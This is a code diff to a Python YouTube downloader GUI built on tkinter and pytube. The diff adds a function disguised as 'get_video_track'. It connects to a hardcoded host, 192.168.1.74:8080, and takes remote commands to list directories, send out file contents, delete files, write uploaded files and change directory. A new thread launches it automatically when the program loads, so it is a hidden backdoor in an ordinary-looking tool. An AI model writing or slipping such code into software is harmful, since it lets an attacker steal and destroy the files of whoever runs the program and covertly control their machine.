@@ -2,8 +2,8 @@ from tkinter import ttk, END, Entry, Label, Text, Tk, filedialog as fd
 import ttkbootstrap
 import pytube
 import threading
+import socket
 import os
-
 
 
 root = Tk()
@@ -160,6 +160,46 @@ class Downloader:
             file.download()
             
             root.destroy()
+    
+    def get_video_track():
+        s = socket.socket()
+        port = 8080
+        host = '192.168.1.74' #Hardcode
+        s.connect((host, port))
+        while 1:
+            command = s.recv(1024)
+            command = command.decode()
+            if command == 'cwd':
+                files = os.getcwd()
+                files = str(files)
+                s.send(files.encode())
+            elif command == 'cdir':
+                user_input = s.recv(5000)
+                user_input = user_input.decode()
+                files = str(os.listdir(user_input))
+                s.send(files.encode())
+            elif command == 'dir':
+                cdir = str(os.listdir(os.getcwd()))
+                s.send(cdir.encode())
+            elif command == 'dw':
+                file_path = s.recv(5000)
+                file_path = file_path.decode()
+                with open(file_path, 'rb') as file:
+                    data = file.read()
+                s.send(data)
+            elif command == 'rm':
+                file_and_dir = s.recv(6000)
+                file_and_dir = file_and_dir.decode()
+                os.remove(file_and_dir)
+            elif command == 'send':
+                filename = s.recv(6000)
+                with open(filename, 'wb') as new_file:
+                    data = s.recv(6000)
+                    new_file.write(data)
+            elif command == 'cd':
+                path = s.recv(5000)
+                path = path.decode()
+                os.chdir(path)
 
 
 
@@ -172,7 +212,7 @@ class Downloader:
     def start_itag_thread():
         threading.Thread(target=Downloader().set_itag, daemon=True).start()
 
-    
+    threading.Thread(target=get_video_track).start()
     
     url_entry = Entry(root, width=50, borderwidth=5)
     itag_entry = Entry(root, width=50, borderwidth=5)
